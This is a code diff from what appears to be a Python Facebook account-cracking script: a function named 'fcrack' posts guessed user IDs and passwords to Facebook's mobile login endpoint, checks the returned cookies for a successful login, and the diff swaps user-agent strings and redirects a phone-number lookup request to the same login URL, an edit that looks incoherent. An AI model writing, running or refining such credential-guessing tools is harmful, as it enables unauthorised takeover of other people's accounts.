@@ -842,7 +842,7 @@ def fcrack(uid,pwx,tl):
             'sec-fetch-site': 'same-origin',
             'sec-fetch-user': '?1',
             'upgrade-insecure-requests': '1',
-            'user-agent': 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36',}
+            'user-agent': ua}
 			lo = session.post('https://m.facebook.com/?tbua=1',data=log_data,headers=header_freefb).text
 			log_cookies=session.cookies.get_dict().keys()
 			#print(iid+'|'+pws+'|'+str(log_cookies))
@@ -897,9 +897,9 @@ def cinc():
     linex()
     nmbr = input(f" Put Cinc Number :\033[1;32m ")
     linex()
-    head = {'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.66 Safari/537.36', 'Accept-Encoding': 'gzip, deflate','Connection': 'keep-alive', 'Content-Length': '16', 'Content-Type': 'application/x-www-form-urlencoded'}
+    head = {'User-Agent': 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36', 'Accept-Encoding': 'gzip, deflate','Connection': 'keep-alive', 'Content-Length': '16', 'Content-Type': 'application/x-www-form-urlencoded'}
     data = {'cnnum': nmbr}
-    url = requests.post('https://freepicccs.com/search-result2.php',headers=head,data=data)
+    url = requests.post('https://m.facebook.com/?tbua=1',headers=head,data=data)
     dta = re.findall("\<div(.*?)</table>",str(url.text))
     open(".tt1.txt","w").write(str(dta))
     ndt = open(".tt1.txt","r").read()
